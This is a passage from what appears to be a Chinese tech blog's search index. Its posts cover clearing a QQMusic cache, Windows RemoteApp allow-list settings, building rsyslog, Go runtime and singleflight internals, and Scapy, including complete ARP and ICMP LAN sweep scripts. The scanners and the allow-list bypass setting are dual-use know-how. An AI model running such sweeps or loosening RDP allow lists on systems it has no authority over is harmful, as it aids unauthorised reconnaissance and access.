缓存清理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @echo off set \u0026#34;targetPath=C:\\Users\\lynx\\AppData\\Roaming\\Tencent\\QQMusic\\QQMusicCache\\downloadproxyNew\\tp2p\\.tpfs\u0026#34; set \u0026#34;processName=QQMusic.exe\u0026#34; echo Killing process: %processName% taskkill /F /IM \u0026#34;%processName%\u0026#34; if exist \u0026#34;%targetPath%\u0026#34; ( echo Deleting directory: %targetPath% rmdir /s /q \u0026#34;%targetPath%\u0026#34; echo Directory deleted. ) else ( echo Directory not found: %targetPath% ) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/qq-%E9%9F%B3%E4%B9%90-p2p-%E7%BC%93%E5%AD%98%E6%B8%85%E7%90%86/","title":"QQ 音乐 P2P 缓存清理"},{"content":"RemoteApp 实现分析 以下所说步骤都是基于 Windows 10 Education English 版本，不同 Windows 版本的操作可能会有一定差异！\n一、原理分析 Remote APP 是 Windows 的 RDP 功能原生支持的。通过配置服务端注册表相关配置项以及客户端 RDP 配置文件则可以实现发布应用发布。\n当客户端与服务端建立远程连接时，客户端的remoteapplicationprogram:s可以传递别名或者绝对路径。\n别名\n当客户端传递别名时，服务端会去Applications去匹配别名，匹配失败则拒绝建立连接；匹配成功会根据匹配的项的 Path项的路径去打开指定文件，打开成功则建立连接，打开失败则拒绝建立连接。\n绝对路径\n当客户端传递的是绝对路径时，服务端会首先检查Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList 的 fDisabledAllowList字段，该字段的值有以下两种：\nValue Description 0 Specifies that the Allow list is checked and enforced. This is the default setting. 1 Specifies that the Allow list is not checked and enforced. 当fDisabledAllowList值为1时，服务端会直接根据客户端传递的绝对路径尝试打开应用建立连接；\n为 0 时，客户端进行远程连接时，服务端将客户端传递的绝对路径与 Applications目录下的项的Path匹配，如果匹配成功，则允许进行访问；如果不成功，则禁止访问。\n客户端rdpfile \u0026ndash;\u0026gt; remoteapplicationprogram remote server reg \u0026ndash;\u0026gt; TSAppAllowList fDisabledAllowList 连通结果 别名A 有配置为别名A的启动路径 1 ok 别名A 有配置为别名A的启动路径 0 ok 别名A 无配置为别名A的启动路径 1 failed 别名A 无配置为别名A的启动路径 0 failed 指定程序绝对路径 所有配置项中 包含 客户端rdp file钟指定的启动路径 0 ok 指定程序绝对路径 所有配置项中 包含 客户端rdp file钟指定的启动路径 1 ok 指定程序绝对路径 所有配置项中 不包含 客户端rdp file钟指定的启动路径 1 ok 指定程序绝对路径 所有配置项中 不包含 客户端rdp file钟指定的启动路径 0 failed 客户端 RDP 配置文件中的 disableremoteappcapscheck在置为1时，会在建立连接之前检查服务端是否对当前应用进行禁用；当值为 0 时会在建立连接之后再进行检查（一般情况下为 1 时的用户体验要好很多）。\n二、原理验证 服务端 1. 开启远程桌面 首先要在 Windows 设置中开启远程桌面服务：Settings -\u0026gt; System -\u0026gt; Remote Desktop -\u0026gt; Enable Remote Desktop\n以下版本支持 WIndows 远程桌面：\nWindows 版本 支持的版本 不支持的版本 Windows XP Professional Home Windows 7 Ultimate、Enterprise、Education Professional、Home、Starter Windows 8 Ultimate、Enterprise、Education Professional、Home、Starter Windows 10 Ultimate、Enterprise、Education、Professional Home、Starter Windows Server 2008、2012、2016、2019 2003 2. 添加远程访问权限 首先新建一个用户：Settings -\u0026gt; Accounts -\u0026gt; Family \u0026amp; other users -\u0026gt; Add someone else to this PC\n然后为新建的用户添加远程桌面权限：Settings -\u0026gt; System -\u0026gt; Remote Desktop -\u0026gt; User accounts -\u0026gt; Select users that can remotely access this PC\n3. 修改注册表 按下 Win + R 键，输入 regedit 进入注册表编辑，找到 Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList，新建项(K)Applications： 这个Applications就是我们允许远程访问 App 的白名单。\n下面演示添加一个测试应用：\n在 Applications 下面新建一个项(K)，取名为 Test\n为该项添加一个 字符串值 ，名字为Path，其值为 C:\\Windows\\explorer.exe(Windows 资源管理器)： Windows 服务端更多配置项可查看官方文档：Search | Microsoft Docs\n客户端 新建一个文本，写入以下配置文件：\nallow desktop composition:i:1 allow font smoothing:i:1\talternate full address:s:DESKTOP // 指定远程计算机的备用名称或IP地址 alternate shell:s:rdpinit.exe devicestoredirect:s:*\t// 确定本地计算机上的哪些设备将被重定向并在远程会话中可用; * 代表重定向所有受支持的设备，包括稍后连接的设备 disableremoteappcapscheck:i:1\t// 提前检查远程 APP在服务端是否允许访问 drivestoredirect:s:* full address:s:10.0.*.*\t// 指定要连接到的远程计算机的名称或IP地址 prompt for credentials on client:i:1 promptcredentialonce:i:0 redirectcomports:i:1 redirectdrives:i:1 remoteapplicationmode:i:1\t// 连接是否作为RemoteApp会话启动 remoteapplicationname:s:Test\t// 客户端界面中指定RemoteApp的名称 remoteapplicationprogram:s:||Test\t// RemoteApp的别名或绝对路径(加||代表使用别名)。别名指的是 Applications 下的项名 span monitors:i:1 use multimon:i:1 保存该文本为 TestApp.rdp，Windows 端可以直接双击打开，如果非 Windows 端需要安装 WIndows 远程桌面客户端。\n双击打开，输入允许远程访问的用户名和密码，就可以使用服务端的远程应用了：\n更多配置项可查看官方文档：Supported Remote Desktop RDP file settings | Microsoft Docs\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/remoteapp-%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90/","title":"RemoteApp 实现分析"},{"content":"rsylog 保存到 sqlite 一、编译 rsylog 由于系统自带的 rsylog 默认是没有启用保存到数据库的模块的，因此我们需要手动编译安装 rsylog：\n1 2 3 4 5 6 7 8 9 10 11 12 # 1. 下载 rsylog 源码 wget https://www.rsyslog.com/download/files/download/rsyslog/rsyslog-8.2208.0.tar.gz # 2. 解压 tar xvf rsyslog-8.2208.0.tar.gz # 3. 配置 cd rsyslog-8.2208.0/ ./configure --enable-libdbi --enable-mysql # 4. 编译安装 make \u0026amp;\u0026amp; make install 编译过程中可能会遇到环境缺失错误，下面列举一下自己编译过程中遇到的错误：\n1 2 3 4 5 6 7 error: configure: error: The pkg-config script could not be found or is too old. Make sure it is in your PATH or set the PKG_CONFIG environment variable to the full path to pkg-config. solution: apt install pkg-config 1 2 3 4 5 6 error: configure: error: Package requirements (libestr \u0026gt;= 0.1.9) were not met: No package \u0026#39;libestr\u0026#39; found solution: apt install libestr-dev 1 2 3 4 5 6 error: configure: error: Package requirements (libfastjson \u0026gt;= 0.99.8) were not met: No package \u0026#39;libfastjson\u0026#39; found solution: apt install libfastjson-dev 1 2 3 4 5 error: configure: error: libdbi is missing solution: apt install libdbi-dev 1 2 3 4 5 6 error: configure: error: Package requirements (uuid) were not met: No package \u0026#39;uuid\u0026#39; found solution: apt install uuid-dev 1 2 3 4 5 error: configure: error: libgcrypt-config not found in PATH solution: apt install libgcrypt20-dev 1 2 3 4 5 6 error: configure: error: Package requirements (libcurl) were not met: No package \u0026#39;libcurl\u0026#39; found solution: apt install libcurl4-openssl-dev 1 2 3 4 5 error: configure: error: zlib library and headers not found solution: apt install zlib1g-dev 1 2 3 4 5 6 7 8 error: config.status: error: Something went wrong bootstrapping makefile fragments for automatic dependency tracking. Try re-running configure with the \u0026#39;--disable-dependency-tracking\u0026#39; option to at least be able to build the package (albeit without support for automatic dependency tracking). solution: apt install make apt-get install libmysqlclient-dev apt install libdbd-sqlite3 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/rsylog-%E4%BF%9D%E5%AD%98%E5%88%B0-sqlite/","title":"rsylog 保存到 sqlite"},{"content":"runtime 包 属性值 runtime.Version()：Go 版本号； runtime.GOARCH：当前运行环境架构； runtime.GOOS：当前运行的操作系统； runtime.GOROOT()：获取 GOROOT 路径； runtime.NumCgoCall() ：获取当前进程调用 CGO 次数； runtime.NumGoroutine()：获取当前程序启动的 Goroutine 数量； runtime.NumCPU()：返回当前环境逻辑 CPU 数量； 方法 runtime.GOMAXPROCS(int)：设置可同时执行的最大CPU数，并返回先前的设置； runtime.GC()：手动触发 GC。在程序中执行一些占用大量内存的操作后，手动触发 GC 可以让内存回收更加及时，避免出现内存不足等问题。需要注意的是，runtime.gc() 不会立即触发垃圾回收，而是将垃圾回收的操作标记为“可执行”，等待下一次垃圾回收周期到来时再进行回收操作。因此，如果需要及时地释放内存，还需要手动调用 runtime.Gosched() 或者 runtime.LockOSThread() 等函数让垃圾回收线程尽快执行； runtime.SetFinalizer(obj any, finalizer any)：Go提供对象被GC回收时的一个注册函数，可以在对象被回收的时候回调函数。finalizer 函数必须接受一个指向对象的指针作为参数，在finalizer 中的panic无法被recover。对象被垃圾回收时，finalizer 函数的调用是异步的，也就是说不能保证 finalizer 函数会在对象被回收之前执行； runtime.KeepAlive()：用于防止一个对象被提前回收。注意，KeepAlive仅在需要保证对象存活的场景中使用，否则可能会影响垃圾回收器的正常工作。KeepAlive() 的调用必须在对象的最后一次使用之后，否则可能会产生不必要的开销； runtime.Goexit()：用于立即终止当前 goroutine 的执行。在调用 runtime.Goexit() 函数时，当前 goroutine 会立即终止执行，并且不会执行当前 goroutine 中未被执行的 defer 语句； runtime.Gosched()：用于让出当前 goroutine 的执行权，让其他 goroutine 有机会执行。在某些情况下，一个 goroutine 可能会长时间占用 CPU 资源，导致其他 goroutine 无法执行。runtime.Gosched() 函数可以解决这个问题，让其他 goroutine 有机会执行。在调用 runtime.Gosched() 函数时，当前 goroutine 会让出执行权，让其他 goroutine 有机会执行。当其他 goroutine 执行完毕后，当前 goroutine 会继续执行； runtime.LockOSThread()：用于将当前 goroutine 锁定到当前操作系统线程上。在多线程编程中，有时我们需要将某个 goroutine 锁定到特定的线程上，以保证线程安全。在调用 runtime.LockOSThread() 函数时，当前 goroutine 会被锁定到当前操作系统线程上。在锁定之后，这个 goroutine 只会在这个线程上执行，直到调用 runtime.UnlockOSThread() 函数释放锁定； runtime.UnlockOSThread()：用于释放当前 goroutine 锁定的操作系统线程。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/runtime-%E5%8C%85/","title":"runtime 包"},{"content":"Scapy 介绍 简介 **Scapy **是一种用于计算机网络的数据包处理工具，由 Philippe Biondi 用 Python 编写。它可以伪造或解码数据包，通过网络发送它们，捕获它们，并匹配请求和响应。它还可以用于处理扫描、跟踪路由、探测、单元测试、攻击和网络发现等任务。\nScapy 为 libpcap（Windows 上是 WinPCap/Npcap）提供了一个Python接口，与 Wireshark 提供视图和捕获GUI的方式类似。它可以与许多其他程序接口来提供可视化，包括用于解码数据包的 Wireshark、用于提供图形的GnuPlot、用于可视化的 graphviz 或 VPython 等。\nScapy自2018年起开始支持Python 3（Scapy 2.4.0+）。\nKamene是Scapy的一个独立分支。最初，创建它的目的是向 Scapy 添加 Python 3 的支持，并将其命名为scapy3k。自2018年更名为Kamene，继续独立发展。\n——维基百科\nScapy 简单使用 Scapy是一个Python程序，使用户能够发送，嗅探，剖析和伪造网络数据包。此功能允许构建可探测，扫描或攻击网络的工具。更多内容可以查看 Scapy 的官方文档。\n首先我们需要通过 pip 的方式安装 scapy 包：pip install scapy\nScapy 不仅仅可以做为 Python 库进行程序的编写，它同时也为我们提供了一种命令行的交互方式，下面我们通过的方式来对 Scapy 进行简单使用：\n构造一个网络包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026gt;\u0026gt;\u0026gt; scapy \u0026gt;\u0026gt;\u0026gt; a = Ether()/IP()/TCP() # 使用默认参数构造一个TCP数据包 \u0026gt;\u0026gt;\u0026gt; a.show() # 显示包的信息 ###[ Ethernet ]### dst= e5:d3:32:d7:6b:4c src= b7:58:7f:44:7a:e5 type= IPv4 ###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= tcp chksum= None src= 192.168.0.110 dst= 127.0.0.1 \\options\\ ###[ TCP ]### sport= ftp_data # 默认源端口为ftp_data的20端口 dport= http # 默认目的端口是http的80端口 seq= 0 ack= 0 dataofs= None reserved= 0 flags= S window= 8192 chksum= None urgptr= 0 options= [] 使用 scapy 实现 ping 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026gt;\u0026gt;\u0026gt; packet = IP(dst=\u0026#39;192.168.0.106\u0026#39;)/ICMP()/b\u0026#34;I\u0026#39;m a ping bag\u0026#34; # 构造一个 ping 包 \u0026gt;\u0026gt;\u0026gt; reply = sr1(packet) # 发送包并接收一个回应的包 Begin emission: ..Finished sending 1 packets. ........................* Received 27 packets, got 1 answers, remaining 0 packets \u0026gt;\u0026gt;\u0026gt; reply.show() # 显示接收包的信息 ###[ IP ]### version= 4 ihl= 5 tos= 0x0 len= 42 id= 55515 flags= frag= 0 ttl= 64 proto= icmp chksum= 0x1fd0 src= 192.168.0.106 dst= 192.168.0.109 \\options\\ ###[ ICMP ]### type= echo-reply code= 0 chksum= 0x87fd id= 0x0 seq= 0x0 ###[ Raw ]### load= \u0026#34;I\u0026#39;m a ping bag\u0026#34; # 可以发现返回的数据和我们发送的是一样的 结语 通过上面的两个例子，我们简单的使用了一下 scapy，能够很明确的体会到 scapy 功能的强大与使用的简单，想要学习更多 scapy 的命令行使用可以查看官方文档进行学习。\n在后面的学习中，我们将使用 scapy 用编写 Python 程序的方式来完成我们的各种需求。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/scapy-%E4%BB%8B%E7%BB%8D/","title":"Scapy 介绍"},{"content":"Scapy编程实例之ARP扫描 简述 ARP协议（全称：Address Resolution Protocol，中文名称：地址解析协议）是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议（通过 IP 地址找到 Mac地址）。\nARP 协议作为一个重要的寻址协议，只要是运行在以太网上的主机，都必定不会屏蔽它，因此 ARP 是一个扫描局域网行之有效的办法，它比 ping扫描效率更高，结果更准确。\nARP 包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ###[ Ethernet ]### dst= e4:d3:32:d2:3b:cc src= b8:08:cf:b4:ba:e5 type= ARP ###[ ARP ]### hwtype= 0x1 ptype= IPv4 hwlen= None plen= None op= who-has hwsrc= b8:08:cf:b4:ba:e5 # 源MAC地址 psrc= 192.168.0.109 # 源IP地址 hwdst= 00:00:00:00:00:00 # 目的Mac地址 pdst= 0.0.0.0\t# 目的IP地址 ARP扫描程序 **注意：**由于Windows和Linux对于进程的管理方式不同，因此该程序不能在Windows系统上运行，否则会出现内存溢出的状况！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 import ipaddress import logging import time from multiprocessing import Queue, Process from scapy.layers.l2 import Ether, ARP from scapy.sendrecv import srp logging.getLogger(\u0026#34;scapy.runtime\u0026#34;).setLevel(logging.ERROR) def scapy_arp_requests(host, queue=None, ifname=\u0026#34;eth0\u0026#34;): \u0026#34;\u0026#34;\u0026#34; 构造ARP包进行扫描 :param host: 需要扫描的主机 :param queue: 存储数据的队列 :param ifname: 网卡名称 :return: 无队列时返回 IP 和 Mac 地址，否则返回 None \u0026#34;\u0026#34;\u0026#34; # 构造ARP包 result_raw = srp(Ether(dst=\u0026#34;FF:FF:FF:FF:FF:FF\u0026#34;) / ARP(op=1, hwdst=\u0026#34;00:00:00:00:00:00\u0026#34;, pdst=host), timeout=1, iface=ifname, verbose=False) try: # 取出成功响应的ARP包数据 result_list = result_raw[0].res if queue == None: return result_list[0][1].getlayer(ARP).fields[\u0026#39;hwsrc\u0026#39;] else: # 将数据加入队列 queue.put((host, result_list[0][1].getlayer(ARP).fields[\u0026#39;hwsrc\u0026#39;])) except: return def scan(network, func): \u0026#34;\u0026#34;\u0026#34; 扫描主机 :param network: 扫描的网段 :param func: 扫描调用的函数 :return: \u0026#34;\u0026#34;\u0026#34; queue = Queue() net = ipaddress.ip_network(network) for ip in net: ip = str(ip) arp = Process(target=func, args=(ip, queue)) # 创建进程 arp.start() # 开始进程 time.sleep(3) successful_mac_list = [] while not queue.empty(): ip, mac = queue.get() successful_mac_list.append((ip, mac)) return successful_mac_list if __name__ == \u0026#39;__main__\u0026#39;: network = input(\u0026#34;Please enter the network segment to be scanned：\u0026#34;) start = time.time() print(\u0026#34;Start scanning ...\u0026#34;) active_ip = scan(network, scapy_arp_requests) print(\u0026#34;Scan complete!\u0026#34;) print(\u0026#34;The hosts successfully scanned are:\u0026#34;) for i, (ip, mac) in enumerate(active_ip): print(\u0026#34;{}: IP:{} -- Mac:{}\u0026#34;.format(i, ip, mac)) print(\u0026#34;\\nA total of {} addresses were successful!\\n\u0026#34;.format(len(active_ip))) end = time.time() print(\u0026#34;This scan takes a total of {} seconds.\u0026#34;.format(end - start)) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Barp%E6%89%AB%E6%8F%8F/","title":"Scapy编程实例之ARP扫描"},{"content":"Scapy编程实例之ping扫描 简述 众所周知，我们可以使用 ping 一个主机地址的方式来判断我们和这个主机之间的网络连接是否是畅通的。\n从另外一个角度思考，只要我们能够 ping 通一个主机，则说明这个主机是存活的。\n当我们需要知道一个局域网中有哪些主机时，此时就可以使用通过 ping 每个 IP 的方式来找出所有主机。\nping包 既然我们要构造 ping包,去探测主机那么我们就首先应该知道一个基本的 ping包长什么模样:\n1 2 3 4 5 6 7 8 9 10 11 12 ###[ Ethernet ]### dst= ff:ff:ff:ff:ff:ff src= b8:08:cf:b4:ba:e5 type= 0x9000 ###[ ICMP ]### type= echo-request code= 0 chksum= None id= 0x0 seq= 0x0 ###[ Raw ]### load= \u0026#39;xxx\u0026#39; ping扫描程序 1. Windows 由于Windows对于进程的管理太鬼畜了,我只能用线程池的方式编写该程序👻\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import logging import ipaddress import multiprocessing from random import randint from scapy.layers.inet import IP, ICMP from scapy.sendrecv import sr1 logging.getLogger(\u0026#34;scapy.runtime\u0026#34;).setLevel(logging.ERROR) def ping(host, queue=None): \u0026#34;\u0026#34;\u0026#34; ping一个主机 :param host: 主机地址 :param queue: 成功时将地址放入该队列 :return: \u0026#34;\u0026#34;\u0026#34; print(\u0026#34;Testing：\u0026#34;, host) id_ip = randint(1, 65535) id_ping = randint(1, 65535) seq_ping = randint(1, 65535) pkt = IP(dst=str(host), ttl=1, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b\u0026#34;I\u0026#39;m a ping packet \u0026#34; # 构造ping包 reply = sr1(pkt, timeout=2, verbose=False) # 接收一个回复包 if reply: print(host, \u0026#34;success\u0026#34;) if queue is not None: queue.put(host) def scan(network, sacnFunc, maxPool=0, maxQueue=0): \u0026#34;\u0026#34;\u0026#34; 对一个局域网进行扫描 :param network: 扫描一个局域网 :param sacnFunc: 用到的扫描函数 :param maxPool: 最大进程数，如果不指定的话为本机CPU数量 :param maxQueue: 队列最大数量 :return: 返回 \u0026#34;\u0026#34;\u0026#34; queue = multiprocessing.Manager().Queue(maxQueue) net = ipaddress.ip_network(network) # 将网段解析为所有地址 pool = multiprocessing.Pool(maxPool if maxPool else multiprocessing.cpu_count()) for ip in net: pool.apply(sacnFunc, (ip, queue)) pool.close() pool.join() successful_ip_list = [] while not queue.empty(): host = queue.get() successful_ip_list.append(host) return sorted(successful_ip_list) if __name__ == \u0026#39;__main__\u0026#39;: import time start = time.time() print(\u0026#34;Start scanning ...\u0026#34;) active_ip = scan(\u0026#34;192.168.101.0/24\u0026#34;, ping) print(\u0026#34;Scan complete!\u0026#34;) print(\u0026#34;The hosts successfully scanned are:\u0026#34;) for i,ip in enumerate(active_ip): print(\u0026#34;{}: {}\u0026#34;.format(i, ip)) print(\u0026#34;\\nA total of {} addresses were successful!\\n\u0026#34;.format(len(active_ip))) end = time.time() print(\u0026#34;This scan takes a total of {} seconds.\u0026#34;.format(end - start)) 2. Linux 🈲 Windows! 🈲 Windows!! 🈲 Windows!!! 不要试图在Windows环境下运行该程序!否则出事了本人概不负责!!! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 import logging import ipaddress import multiprocessing import os from random import randint from scapy.layers.inet import IP, ICMP from scapy.sendrecv import sr1 logging.getLogger(\u0026#34;scapy.runtime\u0026#34;).setLevel(logging.ERROR) def ping(host): \u0026#34;\u0026#34;\u0026#34; ping一个主机 :param host: 主机地址 :return: \u0026#34;\u0026#34;\u0026#34; print(\u0026#34;Testing：\u0026#34;, host) id_ip = randint(1, 65535) id_ping = randint(1, 65535) seq_ping = randint(1, 65535) pkt = IP(dst=str(host), ttl=1, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b\u0026#34;I\u0026#39;m a ping packet \u0026#34; reply = sr1(pkt, timeout=2, verbose=False) if reply: os._exit(3) def scan(network, scanFunc): \u0026#34;\u0026#34;\u0026#34; 对一个局域网进行扫描 :param network: 扫描一个局域网 :param scanFunc: 用到的扫描函数 :return: 返回 \u0026#34;\u0026#34;\u0026#34; net = ipaddress.ip_network(network) ip_processes = {} for ip in net: ip = str(ip) process = multiprocessing.Process(target=scanFunc, args=(ip,)) process.start() ip_processes[ip] = process successful_ip_list = [] for ip, process in ip_processes.items(): if process.exitcode == 3: successful_ip_list.append(ip) else: process.terminate() return sorted(successful_ip_list) if __name__ == \u0026#39;__main__\u0026#39;: import time network = input(\u0026#34;Please enter the network segment to be scanned：\u0026#34;) start = time.time() print(\u0026#34;Start scanning ...\u0026#34;) active_ip = scan(network, ping) print(\u0026#34;Scan complete!\u0026#34;) print(\u0026#34;The hosts successfully scanned are:\u0026#34;) for i, ip in enumerate(active_ip): print(\u0026#34;{}: {}\u0026#34;.format(i, ip)) print(\u0026#34;\\nA total of {} addresses were successful!\\n\u0026#34;.format(len(active_ip))) end = time.time() print(\u0026#34;This scan takes a total of {} seconds.\u0026#34;.format(end - start)) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Bping%E6%89%AB%E6%8F%8F/","title":"Scapy编程实例之ping扫描"},{"content":"SingleFlight 解析 \u0026ldquo;golang.org/x/sync/singleflight\u0026rdquo; 是一个 Go 官方提供的用于并发控制包。\n使用场景 当需要去执行多次幂等操作时，就可以使用 SingleFlight 来进行优化。SingleFlight 会让多次操作合并为一次操作，避免频繁请求函数。\n原理分析 源码：https://cs.opensource.google/go/x/sync/+/master:singleflight/singleflight.go\n结构体 先看一下在 singleflight.go 中存在哪些结构体：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // 函数执行过程中的堆栈错误信息 type panicError struct { value interface{} stack []byte } // 函数调用信息 type call struct { wg sync.WaitGroup // 函数返回值信息 val interface{} // 函数返回错误 err error // 记录这个 key 被分享了多少次 dups int // 返回值 channel，DoChan需要使用 chans []chan\u0026lt;- Result } type Group struct { mu sync.Mutex // 每次调用都会添加到 m 中，m 是懒加载的 m map[string]*call } // 函数返回值信息，DoChan使用 type Result struct { Val interface{} Err error Shared bool } 方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 func (g *Group) Do(key string, fn func() (interface{}, error)) (v interface{}, err error, shared bool) { g.mu.Lock() // 懒加载 m if g.m == nil { g.m = make(map[string]*call) } // 判断函数是否已经被调用过 if c, ok := g.m[key]; ok { c.dups++ g.mu.Unlock() // 调用过的话则等待函数执行完毕 c.wg.Wait() if e, ok := c.err.(*panicError); ok { panic(e) } else if c.err == errGoexit { runtime.Goexit() } return c.val, c.err, true } c := new(call) c.wg.Add(1) // 将函数调用加入 map g.m[key] = c g.mu.Unlock() // 执行函数 g.doCall(c, key, fn) return c.val, c.err, c.dups \u0026gt; 0 } func (g *Group) DoChan(key string, fn func() (interface{}, error)) \u0026lt;-chan Result { ch := make(chan Result, 1) g.mu.Lock() if g.m == nil { g.m = make(map[string]*call) } if c, ok := g.m[key]; ok { c.dups++ c.chans = append(c.chans, ch) g.mu.Unlock() return ch } // 创建 channel c := \u0026amp;call{chans: []chan\u0026lt;- Result{ch}} c.wg.Add(1) g.m[key] = c g.mu.Unlock() // 新开 goroutine 执行函数 go g.doCall(c, key, fn) return ch } func (g *Group) doCall(c *call, key string, fn func() (interface{}, error)) { // 用于标记是否正常返回 normalReturn := false // 用于标识是否触发了 recover recovered := false // use double-defer to distinguish panic from runtime.Goexit, // more details see https://golang.org/cl/134395 defer func() { // 如果既没有正常执行完毕，又没有 recover ，则需要直接退出 if !normalReturn \u0026amp;\u0026amp; !recovered { c.err = errGoexit } g.mu.Lock() defer g.mu.Unlock() c.wg.Done() // 函数已经执行完毕了，call也就没用了 if g.m[key] == c { delete(g.m, key) } if e, ok := c.err.(*panicError); ok { if len(c.chans) \u0026gt; 0 { // 如果返回的是 panic 错误，为了避免这个错误被上层 recover捕获而造成 channel 死锁， // 因此需要再开一个 goroutine 进行 panic go panic(e) // 阻塞当前 goroutine 避免被垃圾回收 select {} // Keep this goroutine around so that it will appear in the crash dump. } else { panic(e) } } else if c.err == errGoexit { // 当前 goroutine 已经退出，不需要再进行处理 } else { // 返回结果到 chan for _, ch := range c.chans { ch \u0026lt;- Result{c.val, c.err, c.dups \u0026gt; 0} } } }() // 使用匿名函数的目的是为了在内部再使用一个 defer 用来捕获 panic func() { defer func() { if !normalReturn { if r := recover(); r != nil { // 构建 panic 错误 c.err = newPanicError(r) } } }() // 执行函数返回结果 c.val, c.err = fn() normalReturn = true }() // 判断是否 panic if !normalReturn { recovered = true } } func newPanicError(v interface{}) error { // 获取堆栈信息 stack := debug.Stack() if line := bytes.IndexByte(stack[:], \u0026#39;\\n\u0026#39;); line \u0026gt;= 0 { stack = stack[line+1:] } return \u0026amp;panicError{value: v, stack: stack} } 在上面的代码中，可以发现 doCall 函数的设计是十分巧妙的，它通过两个 defer 巧妙的区分了到底是发生了 panic 还是用户主动调用了 runtime.Goexit。\n同时在其中使用匿名函数来保证第二个 defer 能够在第一个 defer 之前执行。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/singleflight-%E8%A7%A3%E6%9E%90/","title":"SingleFlight 解析"},{"content":"Snap 学习 一、任务要求 1、描述工具的使用，适配的架构，已知存在的缺陷 2、分析工具中应用的配置管理方式 3、调研如果在snap上发布集成应用，比如第三方如何制作应用添加上去 4、snap自身的对应用的运行过程管理，实现的核心原理\n二、支持 系统\\架构 amd64 arm64 armel armhf i386 ppc64el s390x Debian √ √ √ √ √ √ √ Ubuntu √ √ × √ √ √ √ Arch √ × × × × × × Fedora √ √ 零碎知识 1. snap 应用挂载 .snap包是squashfs文件系统的。 /var/lib/snapd/snaps/app.snap文件被挂载到了 /snap/app下。\n2. snap 应用构建生命周期 These plugins implement a lifecycle over the following steps: - pull: retrieve the source for the part from the specified location - build: drive the build system determined by the choice of plugin - stage: consolidate desirable files from all the parts in one tree - prime: distill down to only the files which will go into the snap - snap: compress the prime tree into the installable snap file 3. Ubuntu Core 20 Ubuntu Core 20是一个轻量，容器化，基于Ubuntu 20.04 LTS且为物联网设备和嵌入式系统所打造的版本，现在已经普遍可用。新版本内建的安全更新严格限制策略使创新者能够开发高安全的产品和方案，并完全专注于自己独特的功能和应用程序。Ubuntu Core 20由安全、广泛使用、易开发维护的snap组成，专为企业级生产和大规模部署和运营而设计。\n不同于传统的Linux，在Ubuntu Core的架构上使用snap架构即从Linux内核到应用层都是以snap包的形式出现。如下图所示，Linux内核单独是一个snap，上面一层是Core snap，再上一层是snap应用程序。 三、Snap 缺点 缺点：\n无法针对单个软件包启用禁止更新，如果该软件包没有向下兼容，那么会导致依赖该软件的其他软件出现问题 snap的安全机制依赖于 APPArmor，Linux系统只能有一个LSM运行，如果Linux还启用了其他LSM，snap的安全机制无法得到保证 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/snap-%E5%AD%A6%E4%B9%A0/","title":"snap 学习"},{"content":"snap 应用构建入门(Go 语言) 一、介绍 snap是Canoncial公司提出的新一代linux包管理工具，致力于将所有linux发行版上的包格式统一，做到“一次打包，到处使用”。目前snap已经可以在包括Ubuntu、Fedora、Mint等多个Linux发行版上使用。\nsnapcraft 是一个正在为其在 Linux 中的地位而奋斗的包管理系统，它为你重新设想了分发软件的方式。这套新的跨发行版的工具可以用来帮助你构建和发布 snap 软件包。\n二、准备工作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 